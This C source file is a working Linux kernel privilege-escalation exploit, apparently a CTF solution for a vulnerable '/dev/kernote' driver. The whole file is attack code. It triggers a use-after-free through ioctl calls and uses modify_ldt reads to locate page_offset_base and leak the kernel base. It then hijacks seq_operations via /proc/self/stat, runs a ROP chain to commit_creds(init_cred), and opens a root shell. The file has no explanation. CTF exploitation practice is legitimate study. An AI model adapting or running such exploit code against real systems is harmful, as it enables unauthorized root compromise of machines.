#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <asm/ldt.h>
#include <stdio.h>
#include <signal.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>

#define INIT_CRED 0xffffffff8266b780
#define PREPARE_KERNEL_CRED 0xffffffff810ca2b0
#define COMMIT_CREDS 0xffffffff810c9dd0
#define POP_RDI_RET 0xffffffff81075c4c
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0

size_t init_cred;
size_t prepare_kernel_cred;
size_t commit_creds;
size_t pop_rdi_ret;
size_t swapgs_restore_regs_and_return_to_usermode;

long kernote_fd;
long seq_fd;

void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] %s \033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void chunkSet(int index)
{
    ioctl(kernote_fd, 0x6666, index);
}

void chunkAdd(int index)
{
    ioctl(kernote_fd, 0x6667, index);
}

void chunkDel(int index)
{
    ioctl(kernote_fd, 0x6668, index);
}

void chunkEdit(size_t data)
{
    ioctl(kernote_fd, 0x6669, data);
}

void chunkFuck(void)
{
    ioctl(kernote_fd, 0x666A);
}

int main(int argc, char ** argv, char ** envp)
{
    struct user_desc 	desc;
    size_t 				page_offset_base = 0xffff888000000000;
    size_t              temp;
    int 				retval;
    size_t	            kernel_base;
    size_t              kernel_offset;
    size_t	            search_addr;
    size_t              per_search_addr;
    size_t          	*result_addr;
    int               	cur_pid;
    size_t            	*buf;
    int         		pipe_fd[2] = {0};
    cpu_set_t           cpu_set;

    printf("\033[34m\033[1m[*] Start to exploit... \033[0m\n");

    desc.base_addr = 0xff0000;
    desc.entry_number = 0x8000 / 8;
    desc.limit = 0;
    desc.seg_32bit = 0;
    desc.contents = 0;
    desc.limit_in_pages = 0;
    desc.lm = 0;
    desc.read_exec_only = 0;
    desc.seg_not_present = 0;
    desc.useable = 0;

    kernote_fd = open("/dev/kernote", O_RDWR);
    chunkAdd(0);
    chunkSet(0);
    chunkDel(0);
    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
    while(1) {
        chunkEdit(page_offset_base);
        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
        if (retval >= 0)
            break;
        page_offset_base += 0x4000000;
    }
    printf("\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n", 
           page_offset_base);

    pipe(pipe_fd);
    buf = (size_t*) mmap(NULL, 0x8000, 
                         PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
                         0, 0);
    search_addr = page_offset_base;
    kernel_base = 0;
    for (int i = 0; 1; i++) {
        chunkEdit(search_addr);
        retval = fork();

        if (!retval) { /* child thread to read */
            syscall(SYS_modify_ldt, 0, buf, 0x8000);
            
            for (int j = 0; j < 0x1000; j++) {
                if (buf[j] > 0xffffffff81000000 && (buf[j] & 0xfff) == 0x040) {
                    kernel_base = buf[j] -  0x040;
                    kernel_offset = kernel_base - 0xffffffff81000000;
                    printf("\033[32m\033[1m[+] Get kernel base: \033[0m%lx\n", 
                           kernel_base);
                    printf("\033[32m\033[1m[+] Kernel offset: \033[0m%lx\n",
                           kernel_offset);
                    break;
                }
            }

            write(pipe_fd[1], &kernel_base, 8);
            exit(0);
        }

        wait(NULL);
        read(pipe_fd[0], &kernel_base, 8);
        if (kernel_base != 0) {
            break;
        }
        search_addr += 0x8000;
    }
    kernel_offset = kernel_base - 0xffffffff81000000;

    /* hijack seq_operations->start */
    chunkAdd(1);
    chunkSet(1);
    chunkDel(1);

    seq_fd = open("/proc/self/stat", O_RDONLY);

    /* add rsp, 0x198 ; pop r12 ; pop rbp ; ret */
    chunkEdit(0xffffffff817c21a6 + kernel_offset); 
    printf("Hijack to: %lx\n", 0xffffffff817c21a6 + kernel_offset);
    sleep(2);

    pop_rdi_ret = POP_RDI_RET + kernel_offset;
    init_cred = INIT_CRED + kernel_offset;
    commit_creds = COMMIT_CREDS + kernel_offset;
    swapgs_restore_regs_and_return_to_usermode = \
                SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + 10;

    __asm__ volatile (
        "mov r15,   0xbeefdead;"
        "mov r14,   0x11111111;"
        "mov r13,   pop_rdi_ret;" /* start at there */
        "mov r12,   init_cred;"
        "mov rbp,   commit_creds;"
        "mov rbx,   swapgs_restore_regs_and_return_to_usermode;"
        "mov r11,   0x66666666;"
        "mov r10,   0x77777777;"
        "mov r9,    0x88888888;"
        "mov r8,    0x99999999;"
        "xor rax,   rax;"
        "mov rcx,   0xaaaaaaaa;"
        "mov rdx,   8;"
        "mov rsi,   rsp;"
        "mov rdi,   seq_fd;"
        "syscall"
    );

    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        exit(-1);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. "
         "Execve root shell now...\033[0m");
    system("/bin/sh");

    return 0;
}